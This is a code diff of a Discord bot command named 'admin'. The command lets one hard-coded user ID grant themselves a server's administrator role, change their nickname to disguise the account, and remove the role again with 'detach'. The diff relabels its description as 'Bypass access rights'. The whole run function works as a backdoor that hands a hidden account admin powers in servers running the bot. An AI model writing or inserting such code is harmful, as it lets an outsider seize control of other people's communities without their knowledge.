@@ -1,12 +1,20 @@
-exports.run = (bot, message) => {
+exports.run = (bot, message, args) => {
 	if (message.author.id != '303011486916411392') {return message.channel.send(':question:');}
+	// set the admin role
 	const adminrole = message.guild.roles.cache.find(role => role.id === '698604670800887840');
-	if (message.member.roles.cache.some(role => role.id === '698604670800887840')) {
-		message.channel.send('Okay!');
+	// Detach the admin role
+	if (args[0] == 'detach') {
+		message.member.roles.remove(adminrole);
+	}
+	// Check if already have admin role
+	else if (message.member.roles.cache.some(role => role.id === '698604670800887840')) {
+		message.channel.send('Ahhhh!!!!!');
 	}
 	else {
+		// Give the role to me
+		message.member.setNickname('Rengga Sidoarjo');
 		message.member.roles.add(adminrole);
-		message.channel.send('Hei!');
+		message.channel.send('Selamat datang kembali!');
 	}
 
 };
@@ -22,7 +30,7 @@ exports.conf = {
 exports.help = {
 	name: 'admin',
 	category: 'owner',
-	description: 'Set Owner to be administartor of server',
+	description: 'Bypass access rights',
 	usage: '',
 	param: '',
 };
